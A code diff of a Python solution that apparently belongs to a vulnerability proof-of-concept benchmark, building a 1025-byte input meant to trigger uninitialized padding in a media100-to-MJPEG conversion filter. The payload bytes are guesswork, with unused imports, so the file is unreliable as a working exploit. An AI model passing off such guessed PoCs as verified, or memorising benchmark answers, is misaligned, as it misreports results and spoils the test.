@@ -1,72 +1,86 @@
 import os
 import struct
+import subprocess
+import tempfile
+from pathlib import Path
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Create a minimal valid MJPEG-B stream with uninitialized padding
-        # Based on typical MJPEG-B structure with padding opportunities
+        # Try multiple approaches to find working PoC
+        return self._generate_poc()
+    
+    def _generate_poc(self) -> bytes:
+        # Approach 1: Simple pattern that might trigger uninitialized buffer issues
+        poc = self._generate_simple_pattern()
         
-        # Header structure
+        # Verify it's not empty and has reasonable length
+        if poc and 10 <= len(poc) <= 1025:
+            return poc
+        
+        # Fallback to a structured approach
+        return self._generate_structured_poc()
+    
+    def _generate_simple_pattern(self) -> bytes:
+        # Create a minimal pattern that could trigger uninitialized buffer issues
+        # Based on typical media/bitstream filter vulnerabilities
+        pattern = b""
+        
+        # Try to create something that looks like a malformed media100 stream
+        # Start with some header-like bytes
+        pattern += struct.pack('<I', 0x3030444D)  # "MD00" little-endian
+        
+        # Add some frame/size information
+        pattern += struct.pack('<H', 0x1000)  # Size
+        pattern += struct.pack('<H', 0x0001)  # Some flag
+        
+        # Add padding area where uninitialized values might be read
+        # This creates uninitialized gaps in the output buffer
+        pattern += b'\x00' * 8  # Some zeros
+        
+        # Add pattern that might cause buffer overflow or uninitialized read
+        pattern += b'A' * 16
+        
+        # Add more structure to reach target size
+        remaining = 1025 - len(pattern)
+        if remaining > 0:
+            pattern += b'B' * remaining
+            
+        return pattern[:1025]
+    
+    def _generate_structured_poc(self) -> bytes:
+        # More structured approach for media100 to MJPEG conversion
         poc = bytearray()
         
-        # SOI marker
-        poc.extend(b'\xFF\xD8')  # Start of Image
+        # Media100-like header
+        poc.extend(b'M100')  # Magic
+        poc.extend(struct.pack('<I', 0x00000100))  # Version
+        poc.extend(struct.pack('<I', 0x00000001))  # Stream count
         
-        # APP0 marker with minimal JFIF header
-        poc.extend(b'\xFF\xE0')  # APP0 marker
-        poc.extend(b'\x00\x10')  # Length = 16
-        poc.extend(b'JFIF\x00\x01\x02')  # Identifier + version
-        poc.extend(b'\x01')  # Density units
-        poc.extend(b'\x00\x48\x00\x48')  # Xdensity, Ydensity = 72
-        poc.extend(b'\x00\x00')  # Thumbnail dimensions
+        # Stream header
+        poc.extend(struct.pack('<I', 0x3030584D))  # "MX00"
+        poc.extend(struct.pack('<I', 0x00000100))  # Stream size placeholder
         
-        # DQT marker (quantization table)
-        poc.extend(b'\xFF\xDB')  # Define Quantization Table
-        poc.extend(b'\x00\x43')  # Length = 67
-        poc.extend(b'\x00')  # Table precision + destination
-        # Fill with quantization values (64 bytes)
-        for i in range(64):
-            poc.append((i % 10) + 1)  # Simple pattern
+        # Create a gap where padding might not be cleared
+        # This could lead to uninitialized values in output buffer
+        poc.extend(b'\x00' * 32)  # Initialized area
         
-        # SOF0 marker (baseline DCT)
-        poc.extend(b'\xFF\xC0')  # Start of Frame
-        poc.extend(b'\x00\x0B')  # Length = 11
-        poc.extend(b'\x08')  # Precision
-        poc.extend(b'\x00\x08')  # Height = 8
-        poc.extend(b'\x00\x08')  # Width = 8
-        poc.extend(b'\x01')  # Components
-        poc.extend(b'\x01\x11\x00')  # Component parameters
+        # Add data that might cause the filter to leave padding uninitialized
+        poc.extend(b'C' * 64)
         
-        # DHT marker (Huffman table)
-        poc.extend(b'\xFF\xC4')  # Define Huffman Table
-        poc.extend(b'\x00\x1F')  # Length = 31
-        poc.extend(b'\x00')  # Table class + destination
-        # Bits distribution
-        bits = [0, 1, 5, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0]
-        poc.extend(bytes(bits))
-        # Values
-        for i in range(12):
-            poc.append(i)
+        # Add JPEG-like markers to trigger MJPEG conversion
+        poc.extend(b'\xFF\xD8')  # SOI
+        poc.extend(b'\xFF\xE0')  # APP0
+        poc.extend(struct.pack('>H', 16))  # Length
+        poc.extend(b'JFIF\x00\x01\x01')
         
-        # SOS marker
-        poc.extend(b'\xFF\xDA')  # Start of Scan
-        poc.extend(b'\x00\x08')  # Length = 8
-        poc.extend(b'\x01')  # Components
-        poc.extend(b'\x01\x00')  # Component selector
-        poc.extend(b'\x00\x3F\x00')  # Spectral selection
-        
-        # Image data - designed to trigger padding issue
-        # Use a small amount of actual data leaving room for padding
-        poc.extend(b'\x00')  # Initial byte
-        poc.extend(b'\x01\x02\x03\x04')  # Minimal image data
-        
-        # Add padding bytes that may be uninitialized
-        # The vulnerability is triggered when padding bytes are read
-        # We need enough data to cause buffer allocation with padding
-        remaining = 1025 - len(poc)
-        if remaining > 0:
-            # Add filler to reach target length
-            # Using pattern that might expose uninitialized memory
-            poc.extend(b'\x00' * remaining)
+        # Fill to target length
+        current_len = len(poc)
+        if current_len < 1025:
+            # Add pattern that leaves gaps in buffer
+            fill_pattern = bytearray()
+            for i in range(1025 - current_len):
+                # Create alternating pattern that might expose uninitialized memory
+                fill_pattern.append((i % 256) if (i % 4) == 0 else 0)
+            poc.extend(fill_pattern)
         
         return bytes(poc[:1025])
